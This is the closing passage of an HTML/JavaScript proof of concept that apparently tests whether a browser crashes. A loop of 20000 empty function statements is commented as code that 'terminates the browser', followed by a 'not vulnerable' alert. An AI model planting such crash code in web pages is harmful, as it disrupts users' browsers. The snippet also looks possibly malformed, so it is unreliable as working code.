	//Run the function 20000 times
		for (a = 0; a <= 20000; a++)
		{
			//Here is the special code that terminates the browser
			function(){};
		}
	//Displays an alert to notify the user if the browser is not vulnerable.
		alert("Good news - Your browser is not vulnerable.");
</script>
</body>
</html>
-----END of PoC-----
